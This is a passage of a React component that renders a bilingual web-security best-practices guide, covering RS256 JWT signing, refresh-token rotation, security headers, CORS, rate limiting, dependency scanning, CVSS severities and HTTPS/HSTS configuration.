      <p style={pStyle}>{t.jwtAlgoDesc}</p>
      <pre style={codeStyle}><code>
        {"// Node.js: Using jsonwebtoken library\n" +
         "import jwt from 'jsonwebtoken';\n" +
         "import fs from 'fs';\n\n" +
         "// INSECURE: HS256 with weak secret\n" +
         "const token = jwt.sign({ userId: 123 }, 'secret'); // NEVER do this\n\n" +
         "// SECURE: RS256 with key pair\n" +
         "const privateKey = fs.readFileSync('./private.pem');\n" +
         "const publicKey = fs.readFileSync('./public.pem');\n\n" +
         "// Sign (auth server)\n" +
         "const token = jwt.sign(\n" +
         "  {\n" +
         "    sub: userId,\n" +
         "    roles: user.roles,\n" +
         "    iss: 'https://auth.yourapp.com',\n" +
         "    aud: 'https://api.yourapp.com',\n" +
         "  },\n" +
         "  privateKey,\n" +
         "  {\n" +
         "    algorithm: 'RS256', // Asymmetric — verify with public key only\n" +
         "    expiresIn: '15m',   // Short-lived access token\n" +
         "  }\n" +
         ");\n\n" +
         "// Verify (resource server)\n" +
         "const payload = jwt.verify(token, publicKey, {\n" +
         "  algorithms: ['RS256'], // Whitelist — prevents algorithm confusion\n" +
         "  issuer: 'https://auth.yourapp.com',\n" +
         "  audience: 'https://api.yourapp.com',\n" +
         "});\n\n" +
         "// NEVER accept 'none' algorithm:\n" +
         "// algorithms: ['RS256'] explicitly blocks it"}
      </code></pre>

      <h3 style={h3Style}>{t.jwtExpirationTitle}</h3>
      <p style={pStyle}>{t.jwtExpirationDesc}</p>
      <pre style={codeStyle}><code>
        {"// Refresh token pattern with rotation\n" +
         "interface Tokens {\n" +
         "  accessToken: string;   // Short-lived: 15 minutes\n" +
         "  refreshToken: string;  // Long-lived: 7 days (stored in Redis)\n" +
         "}\n\n" +
         "async function refreshTokens(refreshToken: string): Promise<Tokens> {\n" +
         "  // 1. Check refresh token exists and is not revoked\n" +
         "  const stored = await redis.get('refresh:' + refreshToken);\n" +
         "  if (!stored) throw new Error('Refresh token invalid or expired');\n\n" +
         "  const { userId, rotationVersion } = JSON.parse(stored);\n\n" +
         "  // 2. Revoke old refresh token (rotation)\n" +
         "  await redis.del('refresh:' + refreshToken);\n\n" +
         "  // 3. Issue new token pair\n" +
         "  const newRefreshToken = crypto.randomBytes(40).toString('hex');\n" +
         "  await redis.set(\n" +
         "    'refresh:' + newRefreshToken,\n" +
         "    JSON.stringify({ userId, rotationVersion: rotationVersion + 1 }),\n" +
         "    { EX: 7 * 24 * 60 * 60 } // 7 days\n" +
         "  );\n\n" +
         "  const accessToken = jwt.sign({ sub: userId }, privateKey, {\n" +
         "    algorithm: 'RS256',\n" +
         "    expiresIn: '15m',\n" +
         "  });\n\n" +
         "  return { accessToken, refreshToken: newRefreshToken };\n" +
         "}"}
      </code></pre>

      {/* ======================== SECURITY HEADERS ======================== */}
      <h2 style={h2Style}>{t.headersTitle}</h2>
      <p style={pStyle}>{t.headersIntro}</p>

      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>{lang === 'zh' ? '响应头' : 'Header'}</th>
              <th style={thStyle}>{lang === 'zh' ? '推荐值' : 'Recommended Value'}</th>
              <th style={thStyle}>{lang === 'zh' ? '作用' : 'Purpose'}</th>
            </tr>
          </thead>
          <tbody>
            {[
              { header: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self' 'nonce-{n}'", desc: t.headerCSPDesc },
              { header: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains; preload', desc: t.hstDesc },
              { header: 'X-Frame-Options', value: 'DENY', desc: t.headerXFrameDesc },
              { header: 'X-Content-Type-Options', value: 'nosniff', desc: t.headerXContentDesc },
              { header: 'Referrer-Policy', value: 'strict-origin-when-cross-origin', desc: t.headerReferrerDesc },
              { header: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()', desc: t.headerPermissionsDesc },
            ].map((row) => (
              <tr key={row.header}>
                <td style={{ ...tdStyle, fontWeight: 600, fontSize: 13, fontFamily: 'monospace', whiteSpace: 'nowrap' }}>{row.header}</td>
                <td style={{ ...tdStyle, fontSize: 12, fontFamily: 'monospace', color: '#22c55e' }}>{row.value}</td>
                <td style={tdStyle}>{row.desc}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <pre style={codeStyle}><code>
        {"// Express.js: Set all security headers\n" +
         "import helmet from 'helmet';\n\n" +
         "app.use(helmet({\n" +
         "  contentSecurityPolicy: {\n" +
         "    directives: {\n" +
         "      defaultSrc: [\"'self'\"],\n" +
         "      scriptSrc: [\"'self'\"],  // Add nonce in middleware\n" +
         "      styleSrc: [\"'self'\"],\n" +
         "      imgSrc: [\"'self'\", 'data:', 'https:'],\n" +
         "      connectSrc: [\"'self'\"],\n" +
         "      frameAncestors: [\"'none'\"],\n" +
         "      baseUri: [\"'self'\"],\n" +
         "      formAction: [\"'self'\"],\n" +
         "    },\n" +
         "  },\n" +
         "  hsts: {\n" +
         "    maxAge: 31536000,\n" +
         "    includeSubDomains: true,\n" +
         "    preload: true,\n" +
         "  },\n" +
         "  frameguard: { action: 'deny' },\n" +
         "  noSniff: true,\n" +
         "  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },\n" +
         "}));\n\n" +
         "// Nginx: Security headers block\n" +
         "# add_header Content-Security-Policy\n" +
         "#   \"default-src 'self'; frame-ancestors 'none'\" always;\n" +
         "# add_header Strict-Transport-Security\n" +
         "#   \"max-age=31536000; includeSubDomains; preload\" always;\n" +
         "# add_header X-Frame-Options DENY always;\n" +
         "# add_header X-Content-Type-Options nosniff always;\n" +
         "# add_header Referrer-Policy strict-origin-when-cross-origin always;"}
      </code></pre>

      {/* ======================== CORS ======================== */}
      <h2 style={h2Style}>{t.corsTitle}</h2>
      <p style={pStyle}>{t.corsIntro}</p>

      <h3 style={h3Style}>{t.corsOriginsTitle}</h3>
      <p style={pStyle}>{t.corsOriginsDesc}</p>
      <pre style={codeStyle}><code>
        {"// Express: CORS with origin validation\n" +
         "import cors from 'cors';\n\n" +
         "const ALLOWED_ORIGINS = [\n" +
         "  'https://app.yoursite.com',\n" +
         "  'https://www.yoursite.com',\n" +
         "  ...(process.env.NODE_ENV === 'development'\n" +
         "    ? ['http://localhost:3000']\n" +
         "    : []),\n" +
         "];\n\n" +
         "app.use(cors({\n" +
         "  origin: (origin, callback) => {\n" +
         "    // Allow requests with no origin (mobile apps, curl, server-to-server)\n" +
         "    if (!origin) return callback(null, true);\n\n" +
         "    if (ALLOWED_ORIGINS.includes(origin)) {\n" +
         "      callback(null, true);\n" +
         "    } else {\n" +
         "      callback(new Error('Not allowed by CORS'));\n" +
         "    }\n" +
         "  },\n" +
         "  credentials: true,     // Allow cookies (requires explicit origin)\n" +
         "  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],\n" +
         "  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],\n" +
         "  maxAge: 86400,          // Cache preflight for 24 hours\n" +
         "}));"}
      </code></pre>

      {/* ======================== RATE LIMITING ======================== */}
      <h2 style={h2Style}>{t.rateLimitTitle}</h2>
      <p style={pStyle}>{t.rateLimitIntro}</p>

      <h3 style={h3Style}>{t.rateLimitStrategiesTitle}</h3>
      <pre style={codeStyle}><code>
        {"// Express: Rate limiting with express-rate-limit + Redis\n" +
         "import rateLimit from 'express-rate-limit';\n" +
         "import RedisStore from 'rate-limit-redis';\n\n" +
         "// Global API rate limit\n" +
         "const apiLimiter = rateLimit({\n" +
         "  windowMs: 15 * 60 * 1000, // 15 minutes\n" +
         "  max: 100,                  // 100 requests per window\n" +
         "  standardHeaders: 'draft-7',\n" +
         "  legacyHeaders: false,\n" +
         "  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),\n" +
         "  message: { error: 'Too many requests, please try again later.' },\n" +
         "});\n\n" +
         "// Strict login rate limit (prevent brute-force)\n" +
         "const loginLimiter = rateLimit({\n" +
         "  windowMs: 15 * 60 * 1000, // 15 minutes\n" +
         "  max: 5,                    // 5 attempts per window\n" +
         "  skipSuccessfulRequests: true, // Only count failures\n" +
         "  message: { error: 'Too many failed login attempts. Try again in 15 minutes.' },\n" +
         "});\n\n" +
         "// Password reset: prevent enumeration + abuse\n" +
         "const resetLimiter = rateLimit({\n" +
         "  windowMs: 60 * 60 * 1000, // 1 hour\n" +
         "  max: 3,\n" +
         "});\n\n" +
         "app.use('/api/', apiLimiter);\n" +
         "app.post('/api/auth/login', loginLimiter, loginHandler);\n" +
         "app.post('/api/auth/forgot-password', resetLimiter, resetHandler);"}
      </code></pre>

      {/* ======================== DEPENDENCY SECURITY ======================== */}
      <h2 style={h2Style}>{t.depsTitle}</h2>
      <p style={pStyle}>{t.depsIntro}</p>

      <h3 style={h3Style}>{t.depsAuditTitle}</h3>
      <p style={pStyle}>{t.depsAuditDesc}</p>
      <pre style={codeStyle}><code>
        {"# Run in CI — fail on high/critical vulnerabilities\n" +
         "npm audit --audit-level=high\n\n" +
         "# GitHub Actions: Add Dependabot\n" +
         "# .github/dependabot.yml\n" +
         "version: 2\n" +
         "updates:\n" +
         "  - package-ecosystem: npm\n" +
         "    directory: /\n" +
         "    schedule:\n" +
         "      interval: weekly\n" +
         "    open-pull-requests-limit: 10\n" +
         "    labels:\n" +
         "      - dependencies\n" +
         "      - security\n\n" +
         "# GitHub Actions: Snyk security scan\n" +
         "- name: Run Snyk security scan\n" +
         "  uses: snyk/actions/node@master\n" +
         "  with:\n" +
         "    args: --severity-threshold=high\n" +
         "  env:\n" +
         "    SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}"}
      </code></pre>

      <h3 style={h3Style}>{t.depsLockTitle}</h3>
      <p style={pStyle}>{t.depsLockDesc}</p>

      {/* ======================== CVSS TABLE ======================== */}
      <h2 style={h2Style}>{t.cvssTitle}</h2>
      <p style={pStyle}>{t.cvssIntro}</p>

      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>{lang === 'zh' ? '评分范围' : 'Score Range'}</th>
              <th style={thStyle}>{lang === 'zh' ? '严重级别' : 'Severity'}</th>
              <th style={thStyle}>{lang === 'zh' ? '响应时间' : 'Response Time'}</th>
              <th style={thStyle}>{lang === 'zh' ? '示例' : 'Examples'}</th>
            </tr>
          </thead>
          <tbody>
            {[
              {
                score: '9.0 – 10.0',
                severity: lang === 'zh' ? '严重' : 'Critical',
                color: '#ef4444',
                response: lang === 'zh' ? '立即（24h内）' : 'Immediate (<24h)',
                examples: 'Log4Shell, Heartbleed, Spring4Shell',
              },
              {
                score: '7.0 – 8.9',
                severity: lang === 'zh' ? '高危' : 'High',
                color: '#f97316',
                response: lang === 'zh' ? '7天内' : 'Within 7 days',
                examples: lang === 'zh' ? 'RCE、SQL 注入、身份验证绕过' : 'RCE, SQL injection, auth bypass',
              },
              {
                score: '4.0 – 6.9',
                severity: lang === 'zh' ? '中危' : 'Medium',
                color: '#f59e0b',
                response: lang === 'zh' ? '30天内' : 'Within 30 days',
                examples: lang === 'zh' ? 'XSS、CSRF、敏感数据泄露' : 'XSS, CSRF, sensitive data exposure',
              },
              {
                score: '0.1 – 3.9',
                severity: lang === 'zh' ? '低危' : 'Low',
                color: '#22c55e',
                response: lang === 'zh' ? '90天内' : 'Within 90 days',
                examples: lang === 'zh' ? '信息泄露、低影响 DoS' : 'Info disclosure, low-impact DoS',
              },
              {
                score: '0.0',
                severity: lang === 'zh' ? '无' : 'None',
                color: '#94a3b8',
                response: lang === 'zh' ? '按需计划' : 'Plan as needed',
                examples: lang === 'zh' ? '无安全影响' : 'No security impact',
              },
            ].map((row) => (
              <tr key={row.score}>
                <td style={{ ...tdStyle, fontWeight: 700, color: row.color }}>{row.score}</td>
                <td style={{ ...tdStyle }}>
                  <span style={{ display: 'inline-block', padding: '2px 10px', borderRadius: 12, background: row.color + '22', color: row.color, fontWeight: 700, fontSize: 13 }}>
                    {row.severity}
                  </span>
                </td>
                <td style={tdStyle}>{row.response}</td>
                <td style={tdStyle}>{row.examples}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* ======================== SECURITY TESTING ======================== */}
      <h2 style={h2Style}>{t.testingTitle}</h2>
      <p style={pStyle}>{t.testingIntro}</p>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: 16, marginBottom: 24 }}>
        {[
          { title: t.testingSASTTitle, desc: t.testingSASTDesc, color: '#3b82f6', icon: '🔍' },
          { title: t.testingDASTTitle, desc: t.testingDASTDesc, color: '#22c55e', icon: '🌐' },
          { title: t.testingPentestTitle, desc: t.testingPentestDesc, color: '#f59e0b', icon: '🔐' },
        ].map((card) => (
          <div key={card.title} style={{ background: 'var(--bg-input)', border: '1px solid var(--border-color)', borderRadius: 8, padding: 16, borderTop: '3px solid ' + card.color }}>
            <p style={{ margin: '0 0 8px', fontWeight: 700, fontSize: 15, color: card.color }}>{card.title}</p>
            <p style={{ margin: 0, fontSize: 13, color: 'var(--text-secondary)', lineHeight: 1.6 }}>{card.desc}</p>
          </div>
        ))}
      </div>

      {/* ======================== HTTPS ======================== */}
      <h2 style={h2Style}>{t.httpsTitle}</h2>
      <p style={pStyle}>{t.httpsIntro}</p>

      <h3 style={h3Style}>{t.hstTitle}</h3>
      <p style={pStyle}>{t.hstDesc}</p>
      <pre style={codeStyle}><code>
        {"# Nginx: Enable HSTS\n" +
         "server {\n" +
         "  listen 443 ssl http2;\n" +
         "  server_name yourapp.com www.yourapp.com;\n\n" +
         "  # HSTS: 1 year, include subdomains, preload\n" +
         "  add_header Strict-Transport-Security\n" +
         "    \"max-age=31536000; includeSubDomains; preload\" always;\n\n" +
         "  # Redirect all HTTP to HTTPS\n" +
         "  # (In a separate server block)\n" +
         "}\n\n" +
         "server {\n" +
         "  listen 80;\n" +
         "  server_name yourapp.com www.yourapp.com;\n" +
         "  return 301 https://$host$request_uri;\n" +
         "}\n\n" +
         "# TLS configuration best practices\n" +
         "ssl_protocols TLSv1.2 TLSv1.3;\n" +
         "ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:...;\n" +
         "ssl_prefer_server_ciphers off;  # TLS 1.3 client preference\n" +
         "ssl_session_timeout 1d;\n" +
         "ssl_session_cache shared:MozSSL:10m;\n" +
         "ssl_stapling on;  # OCSP stapling\n" +
         "ssl_stapling_verify on;"}
      </code></pre>

      {/* ======================== FAQ ======================== */}
      <h2 style={h2Style}>{t.faqTitle}</h2>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
        {[
          { q: t.faq1q, a: t.faq1a },
          { q: t.faq2q, a: t.faq2a },
          { q: t.faq3q, a: t.faq3a },
          { q: t.faq4q, a: t.faq4a },
          { q: t.faq5q, a: t.faq5a },
          { q: t.faq6q, a: t.faq6a },
          { q: t.faq7q, a: t.faq7a },
          { q: t.faq8q, a: t.faq8a },
        ].map((faq, i) => (
          <div key={i} style={{ background: 'var(--bg-input)', border: '1px solid var(--border-color)', borderRadius: 8, padding: '16px 20px', borderLeft: '3px solid #0ea5e9' }}>
            <p style={{ margin: '0 0 8px', fontWeight: 700, fontSize: 15, color: 'var(--text-primary)' }}>
              Q{i + 1}: {faq.q}
            </p>
            <p style={{ margin: 0, color: 'var(--text-secondary)', lineHeight: 1.7, fontSize: 14 }}>{faq.a}</p>
          </div>
        ))}
      </div>

      {/* Final summary */}
      <div style={successBoxStyle}>
        <p style={{ margin: '0 0 8px', fontWeight: 700, fontSize: 15, color: '#15803d' }}>
          {lang === 'zh' ? '安全清单摘要' : 'Security Checklist Summary'}
        </p>
        <ul style={{ margin: 0, paddingLeft: 20 }}>
          {[
            lang === 'zh' ? '参数化查询防止 SQL 注入' : 'Parameterized queries for SQL injection prevention',
            lang === 'zh' ? 'CSP + 输出编码防止 XSS' : 'CSP + output encoding for XSS prevention',
            lang === 'zh' ? 'SameSite Cookie + CSRF 令牌' : 'SameSite cookies + CSRF tokens',
            lang === 'zh' ? 'Argon2id/bcrypt 密码哈希' : 'Argon2id/bcrypt for password hashing',
            lang === 'zh' ? 'RS256 签名 JWT，15 分钟过期' : 'RS256-signed JWTs with 15-minute expiration',
            lang === 'zh' ? '全套安全响应头（helmet.js）' : 'Full security header suite (helmet.js)',
            lang === 'zh' ? 'HTTPS + HSTS（含预加载）' : 'HTTPS + HSTS with preload',
            lang === 'zh' ? 'CI 中自动化依赖扫描' : 'Automated dependency scanning in CI',
            lang === 'zh' ? '认证端点限流' : 'Rate limiting on authentication endpoints',
            lang === 'zh' ? '完整的安全日志和监控告警' : 'Comprehensive security logging and monitoring alerts',
          ].map((item, i) => (
            <li key={i} style={{ fontSize: 14, color: '#166534', lineHeight: 1.7, marginBottom: 4 }}>
              {item}
            </li>
          ))}
        </ul>
      </div>
    </div>
  );
}
